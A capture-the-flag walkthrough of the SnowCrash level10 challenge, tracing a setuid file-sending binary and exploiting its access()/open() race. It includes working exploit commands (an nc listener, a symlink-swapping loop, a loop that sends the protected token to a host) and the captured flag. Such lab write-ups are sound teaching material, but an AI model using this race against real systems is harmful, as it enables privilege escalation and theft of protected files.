## Step 0: Explore available files
level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token

### run the executable
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it

level10@SnowCrash:~$ ./level10 token 192.168.56.103
You don't have access to token

### explore the executable 

level10@SnowCrash:~$ strings level10 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
...
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/usr/lib/gcc/i686-linux-gnu/4.6/include
/usr/include/i386-linux-gnu/bits
/usr/include
/usr/include/netinet
level10.c
...


We can see that it attemps to connect to port 6969
And tries to open a file, that cannot be read 

level10@SnowCrash:~$ ltrace ./level10
__libc_start_main(0x80486d4, 1, 0xbffff7f4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
	sends file to host if you have access to it
) = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++

level10@SnowCrash:~$ ltrace ./level10 token 192.168.56.103
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                               = -1
printf("You don't have access to %s\n", "token"You don't have access to token
) = 31
+++ exited (status 31) +++

It calls access, this is relevant information 

Checking the man

Access: access - check real user's permissions for a file
access()  checks  whether the calling process can access the file path‐
       name.  If pathname is a symbolic link, it is dereferenced.
Warning: Using access() to check if a user is authorized to, for  exam‐
       ple, open a file before actually doing so using open(2) creates a secu‐
       rity hole, because the user  might  exploit  the  short  time  interval
       between  checking and opening the file to manipulate it.  For this rea‐
       son, the use of this system call should be avoided.   (In  the  example
       just  described, a safer alternative would be to temporarily switch the
       process's effective user ID to the real ID and then call open(2).)

if we do 

level10@SnowCrash:~$ strace ./level10 token 192.168.56.103
execve("./level10", ["./level10", "token", "192.168.56.103"], [/* 18 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
...

We see there is a call to access
and then a call to open 

## Conclusions

We can exploit the security hole that is created

Quick google search gives us 
https://stackoverflow.com/questions/7925177/access-security-hole

That is a TOCTOU race (Time of Check to Time of Update). A malicious user could substitute a file he has access to for a symlink to something he doesn't have access to between the access() and the open() calls. Use faccessat() or fstat(). In general, open a file once, and use f*() functions on it (e.g: fchown(), ...).

In three terminals

nc -lk 6969

while true; do ln -s /home/user/level10/token /tmp/link; rm -f /tmp/link; touch /tmp/link; rm -f /tmp/link; done

while true; do ./level10 /tmp/link 192.168.56.103; done

In the first terminal we will see the token

.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
